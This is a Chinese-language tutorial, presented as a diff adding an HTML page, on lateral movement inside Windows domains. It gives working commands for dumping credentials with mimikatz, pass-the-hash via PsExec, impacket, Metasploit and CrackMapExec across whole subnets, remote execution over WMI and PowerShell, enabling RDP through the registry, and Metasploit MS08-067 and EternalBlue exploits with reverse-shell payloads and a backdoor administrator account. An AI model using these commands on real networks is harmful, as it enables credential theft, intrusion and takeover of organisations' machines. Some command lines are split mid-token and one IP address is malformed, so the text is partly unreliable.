@@ -1,0 +1,232 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="cadd64b6466f7bc94bf6e94828ac53a7">前言：</h1>
+<p>在内网渗透中，域内横向移动是一种常见的攻击手法。攻击者会利用此技术，以被攻陷的系统为跳板，访问域内其他主机，扩大资产(包括跳板机中的文档和存储的凭证，以及通过跳板机连接的数据库，域控制器等其他重要资产)。通过此类攻击技术，攻击者最终很可能获取到域控制器的访问权限，甚至控制整个内网的机器权限。</p>
+<h1 data-content="1" id="4f7e6e1474d4b02bb2bebf0c0110a859">1、PTH横向</h1>
+<p>pass-the-hash 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。</p>
+<h2 data-content="1" id="1ce56a8958c769bd8f1fb41339bdbcc9">pass the hash 原理：</h2>
+<p>原理：<br/>
+• 在 Windows 系统中，通常会使用 NTLM 身份认证<br/>
+• NTLM 认证不使用明文口令，而是使用口令加密后的 hash 值，hash 值由系统 API 生成(例如 LsaLogonUser)<br/>
+hash 分为 LM hash 和 NT hash，如果密码长度大于 15，那么无法生成 LM<br/>
+hash。从 Windows Vista 和 Windows Server 2008 开始，微软默认禁用 LMhash<br/>
+• 如果攻击者获得了 hash，就能够在身份验证的时候模拟该用户(即跳过调用<br/>
+API 生成 hash 的过程)<br/>
+这类攻击适用于：<br/>
+• 域/工作组环境<br/>
+• 可以获得 hash，但是条件不允许对 hash 爆破<br/>
+• 内网中存在和当前机器相同的密码<br/>
+微软也对 pth 打过补丁，然而在测试中发现，在打了补丁后，常规的 Pass The Hash 已经无法成功，唯独默认的 Administrator(SID 500)账号例外，利用这个账号仍可以进行 Pass The Hash 远程 ipc 连接。<br/>
+如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可以攻击成功。<br/>
+从 windows 到 windows 横向 pth 这一类攻击方法比较广泛。</p>
+<h2 data-content="1" id="79011b21e477a8ddd73bef1261f85257">用法：使用mimitkaz进行pth</h2>
+<pre><code>privilege::debug
+sekurlsa::logonpasswords
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"&gt; password.txt</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172410-b8dff690-11d3-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172419-bdfce67e-11d3-1.png"/></p>
+<p>得到 hash 后进行</p>
+<pre><code>privilege::debug
+sekurlsa::pth /user:administrator /domain:workgroup /ntlm:627782b7274e323941c9418399460d5b</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172431-c5290ac2-11d3-1.png"/></p>
+<p>远程桌面登录:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172440-ca6baeae-11d3-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172449-cff4185c-11d3-1.png"/></p>
+<p>修改注册表：</p>
+<pre><code>REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
+REG query "HKLM\System\CurrentControlSet\Control\Lsa" | findstr "DisableRestrictedAdmin" #查询结果</code></pre>
+<p>利用过程<br/>
+在本地计算机使用mimikatz登陆远程主机</p>
+<pre><code>sekurlsa::pth /user:administrator /domain:test /ntlm:627782b7274e323941c9418399460d5b "/run:mstsc.exe /restrictedadmin"</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172459-d5bc6dfc-11d3-1.png"/></p>
+<h1 data-content="1" id="8062b23f89596c61c344e0db4a8de339">2、使用psexec横向</h1>
+<p>psexec 是 windows 官方自带的，不会存在查杀问题，属于 pstools 利用 PsExec 可以在远程计算机上执行命令，其基本原理是通过管道在远程目标主机上创建一个psexec 服务，并在本地磁盘中生成一个名为 PSEXESVC 的二进制文件，然后通过psexec 服务运行命令，运行结束后删除服务。<br/>
+利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 服务端口开放。对方开放 445 端口，就相当于开放了 smb 协议</p>
+<h2 data-content="1" id="1348a8a90b40dc50f126f22c48257ed8">psexec 第一种：</h2>
+<p>先有 ipc 链接，psexec 需要明文或 hash 传递</p>
+<pre><code>PsExec64.exe /accepteula /s \\192.168.0.123 -u Administrator -p 123456 cmd</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172508-db517d48-11d3-1.png"/></p>
+<pre><code>-accepteula 第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框
+-s 以 System 权限运行远程进程，如果不用这个参数，就会获得一个对应用户权限的 shell直接直接执行回显
+-u 域\用户名  -p 密码</code></pre>
+<p>PsExec.exe /accepteula /s \192.168.0.141 -u Administrator -p 123456 cmd /c "ipconfig"</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172530-e88d2b24-11d3-1.png"/></p>
+<pre><code>psexec -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba8854
+7376818d4 ./Administrator@192.168.0.123</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172544-f05ddde4-11d3-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172555-f7564ac8-11d3-1.png"/></p>
+<p>上面是建立在明文之上 下面 hash 下进行登录</p>
+<pre><code>psexec -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba8854
+7376818d4 ./Administrator@192.168.0.123</code></pre>
+<p>出现这个错误可以使用 impacket 这个工具包下的 psexec 进行利用<br/>
+python3 psexec.py -hashes  ee:627782b7274e323941c9418399460d5b<br/>
+./Administrator@10.10.10.152</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172610-fff7e31c-11d3-1.png"/></p>
+<p>在使用 PsExec 时需要注意以下几点：<br/>
+• 需要远程系统开启 admin$ 共享（默认是开启的）<br/>
+• 因为 PsExec 连接的原理是基于 IPC 共享，因此目标需要开放 445 端口<br/>
+• 在使用 IPC$ 连接目标系统后，不需要输入账户和密码。<br/>
+• 在使用 PsExec 执行远程命令时，会在目标系统中创建一个 psexec 的服务，<br/>
+命令执行完后，psexec 服务将被自动删除。由于创建或删除服务时会产生<br/>
+大量的日志，因此蓝队在溯源时可以通过日志反推攻击流程。<br/>
+• 使用 PsExec 可以直接获得 System 权限的交互式 Shell 的前提目标是<br/>
+administrator 权限的 shell<br/>
+• 在域环境测试时发现，非域用户无法利用内存中的票据使用 PsExec 功能，<br/>
+只能依靠账号和密码进行传递。<br/>
+登陆域管理命令<br/>
+impacket 下的 psexec<br/>
+python3 psexec.py x/Administrator@10.10.10.152</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172619-05620ee0-11d4-1.png"/></p>
+<p>执行命令后输入密码</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172636-0f651428-11d4-1.png"/></p>
+<p>登陆其他主机管理员<br/>
+psexec /accepteula /s \12server1 -u Administrator -p 123456 cmd</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172645-1526dbb2-11d4-1.png"/></p>
+<h1 data-content="1" id="af40ae1deccc1a6c23f163326aa70bfe">3、使用 msf hash  模块</h1>
+<p>使用该命令进行hash传递。</p>
+<p>use exploit/windows/smb/psexec<br/>
+set SMBUser Administrator<br/>
+set rhosts 192.168.0.141<br/>
+set smbpass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba885473<br/>
+76818d4<br/>
+首先，使用msf生成exe木马。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172654-1a758050-11d4-1.png"/><br/>
+msf进行监听6666端口。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172704-202b9e1c-11d4-1.png"/></p>
+<p>导出hash。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172718-286e2554-11d4-1.png"/></p>
+<p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:627782b7274e323941c9418399460d5b:::<br/>
+set smbpass 500:aad3b435b51404eeaad3b435b51404ee:627782b7274e323941c9418399460d5b<br/>
+然后使用msf进行hash传递。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172731-303c5c7e-11d4-1.png"/></p>
+<h1 data-content="1" id="e1a032e884de8e56c967375461c13a7c">4、CrackMapExec</h1>
+<p>CrackMapExec 可以对 C 段中的主机进行批量 pth,项目地址：<br/>
+<a href="https://github.com/byt3bl33d3r/CrackMapExec.git" target="_blank">https://github.com/byt3bl33d3r/CrackMapExec.git</a><br/>
+使用命令：<br/>
+crackmapexec smb 192.168.0.0/24 -u administrator -H  627782b7274e323941c9418399460d5b</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172739-3543d3c8-11d4-1.png"/></p>
+<p>对 192.168.9.0/24 C 段进行批量 pass the hash</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172750-3bedc7a6-11d4-1.png"/></p>
+<h1 data-content="1" id="5861a7f9e79bac46af33e4941e3f665b">5、WMI</h1>
+<p>WMI 全称 Windows Management Instrumentation 即 Windows 管理工具，Windows 98 以后的操作系统都支持 WMI。由于 Windows 默认不会将 WMI 的操作记录在日志里，同时现在越来越多的杀软将PsExec 加入了黑名单，因此 WMI 比 PsExec 隐蔽性要更好一些。<br/>
+wmic  命令<br/>
+WMI 连接远程主机，并使用目标系统的 cmd.exe 执行命令，将执行结果保存在目标主机 C 盘的 ip.txt 文件中<br/>
+使用 WMIC 连接远程主机，需要目标主机开放 135 和 445 端口<br/>
+( 135 端⼝是 WMIC 默认的管理端⼝，wimcexec 使⽤445 端⼝传回显)</p>
+<pre><code>wmic /node:192.168.0.123 /user:administrator /password:123456 process call create "cmd.exe /c ipconfig &gt; c:\ip.txt"</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172800-41fc6512-11d4-1.png"/></p>
+<p>使用net use查看执行结果，发现成功执行ipconfig命令。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172808-46684e40-11d4-1.png"/></p>
+<h2 data-content="1" id="9ec3eedc72f934e7915ecd02c29974bc">.wmiexec.py</h2>
+<p>在 impacket 工具包里有 wmiexec.py 脚本，可以用来直接获取 shell<br/>
+其他攻击手法可以看下 readme，这里只简单的对 pth 做一下实验：<br/>
+python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5f<br/>
+dc5e9cba88547376818d4 Administrator@192.168.0.141 "whoami"<br/>
+wmiexec.py 的 hash 参数格式为 LM Hash:NT Hash<br/>
+00000000000000000000000000000000 这个部分可以随便填写</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172818-4c48707e-11d4-1.png"/></p>
+<p>尝试执行whoami命令，成功执行该命令。<br/>
+python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:627782b7274e323941c9418399460d5b Administrator@192.168.0.141 "whoami"</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172826-51306916-11d4-1.png"/></p>
+<h2 data-content="1" id="ae1eff7094e716d6ae4976fc3f3ef49a">wmiexec.vbs</h2>
+<p>wmiexec.vbs 脚本通过 VBS 调用 WMI 来模拟 PsExec 的功能，wmiexec.vbs<br/>
+下载地址：<a href="https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs" target="_blank">https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs</a><br/>
+使用 vmiexec.vbs 执行单条命令<br/>
+cscript wmiexec.vbs /cmd 192.168.0.123 administrator 123456 "ipconfig"<br/>
+cscript //nologo wmiexec.vbs /shell 192.168.0.123 administrator 123456</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172835-56710e76-11d4-1.png"/></p>
+<p>然后修改注册表，启动3389远程连接。<br/>
+all create 'cmd.exe /c REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\T<br/>
+erminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172841-5a1fee16-11d4-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172847-5d883c48-11d4-1.png"/></p>
+<p>然后查看状态。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172855-626e9d42-11d4-1.png"/></p>
+<p>也可以使用命令查看远程桌面状态。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172905-684182c0-11d4-1.png"/></p>
+<h2 data-content="1" id="28767154a2dbdfbda890a6dfe0c9c9f6">wmic  的其他命令</h2>
+<p>使用 wmic 远程开启目标的 RDP<br/>
+适于 Windows xp、server 2003</p>
+<pre><code>wmic /node:192.168.7.7 /user:administrator /password:123456 PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 1</code></pre>
+<p>适于 Windows 7、8、10，server 2008、2012、2016，注意 ServerName 需要改<br/>
+为目标的 hostname</p>
+<pre><code>wmic /node:192.168.0.123 /user:administrator /password:123456 RDTOGGLE WHERE ServerName='计算机名' call SetAllowTSConnections 1</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172912-6cd1fbbc-11d4-1.png"/></p>
+<p>或者</p>
+<pre><code>wmic /node:192.168.0.123 /user:administrator /password:123456 process call create 'cmd.exe /c REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\T
+erminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172920-718f06ea-11d4-1.png"/></p>
+<p>可以看到目标上的远程终端已经开启。<br/>
+判断 RDP 有没有开可以使用以下命令，如果返回 0 表示开启，返回 1 表示关闭。</p>
+<pre><code>REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
+Server" /v fDenyTSConnections</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172928-76000846-11d4-1.png"/></p>
+<h1 data-content="1" id="41befcff2e1c1d4e4c8a7c4fed29aa02">6、Invoke-WmiCommand</h1>
+<p>Invoke-WmiCommand.ps1 是 PowerSploit 工具包里的一部分，该脚本是利用Powershell 调用 WMI 来远程执行命令。<br/>
+在 Powershell 中运行以下命令<br/>
+导入 Invoke-WmiCommand.ps1 脚本<br/>
+Import-Module .\Invoke-WmiCommand.ps1<br/>
+指定目标系统用户名<br/>
+$User = ".\administrator"<br/>
+指定目标系统的密码<br/>
+$Password = ConvertTo-SecureString -String "123456" -AsPlainText -Force<br/>
+将账号和密码整合起来，以便导入 Credential<br/>
+$Cred = New-Object -TypeName System.Management.Automation.PSCredential<br/>
+-ArgumentList $User,$Password<br/>
+指定要执行的命令和目标 IP<br/>
+$Remote = Invoke-WmiCommand -Payload {ipconfig} -Credential $Cred -Comp<br/>
+uterName 192.168.0.123<br/>
+将执行结果输出到屏幕上<br/>
+$Remote.PayloadOutput<br/>
+将这些命令配置完成之后，成功执行该命令。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172939-7ccbca0c-11d4-1.png"/></p>
+<h1 data-content="1" id="545201039ee7233e1f6206bdeb31ac06">7、Invoke-WMIMethod</h1>
+<p>Invoke-WMIMethod 是 PowerShell 自带的一个模块，也可以用它来连接远程计算机执行命令和指定程序。<br/>
+执行过程：<br/>
+指定目标系统用户名<br/>
+$User=".\administrator"<br/>
+指定目标系统密码<br/>
+$Password=ConvertTo-SecureString -String "123456" -AsPlainText -Force<br/>
+将账号和密码整合起来，以便导入 Credential 中<br/>
+$Cred=New-Object -TypeName System.Management.Automation.PSCredential -A<br/>
+rgumentList $User,$Password<br/>
+在远程系统中运行 calc.exe 命令<br/>
+Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName "192.168.0.123" -Credential $Cred</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172947-81329c42-11d4-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514172953-8522f4a0-11d4-1.png"/></p>
+<h1 data-content="1" id="b60ae796a26fb046a6a87155143e2ce2">8.利用其它漏洞横向</h1>
+<h2 data-content="1" id="466b68b58616c817b63172a00965b8c7">MS08-067</h2>
+<p>RPC远程缓冲区溢出导致的远程代码执行漏洞<br/>
+适用：Windows 2000;XP;Server 2003;Vista;Server 2008;7 Beta</p>
+<pre><code>javascript
+use exploit/windows/smb/ms08_067_netapi     #使用模块
+set rhosts 172.16.5.27      #设置靶机ip
+set lhost 172.16.5.28      #设置本地ip
+set payload generic/shell_bind_tcp     #设置payload
+exploit</code></pre>
+<h2 data-content="1" id="850e8f2ae7b98429668e90638ff851b4">EhernalBlue(MS17-010)</h2>
+<p>SMBv1 和 NBT 中的远程代码执行漏洞<br/>
+适用：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。（包括但不限于）</p>
+<pre><code>javascript
+
+use auxiliary/scanner/smb/smb_ms17_010             #扫描是否存在该漏洞
+set rhosts 10.10.10.14    #设置目标主机的IP,也可以设置整个IP段
+set threads 10
+exploit</code></pre>
+<pre><code>use exploit/windows/smb/ms17_010_eternalblue    #漏洞利用
+set rhosts 10.10.10.14                          #设置目标主机的IP,也可以设置整个IP段
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 10.10.10.147
+set lport 4444
+exploit</code></pre>
+<pre><code>use exploit/windows/smb/ms17_010_psexec    #漏洞利用
+ set payload windows/meterpreter/bind_tcp
+ set rhost 192.168.33.33
+ exploit</code></pre>
+<pre><code>use auxiliary/admin/smb/ms17_010_command    #漏洞利用
+set rhosts=192.168.26.33.33
+set COMMAND net user hack  hack123 /add
+set COMMAND net localgroup administrators hack  /add
+exploit</code></pre>
+</div>
+</div>
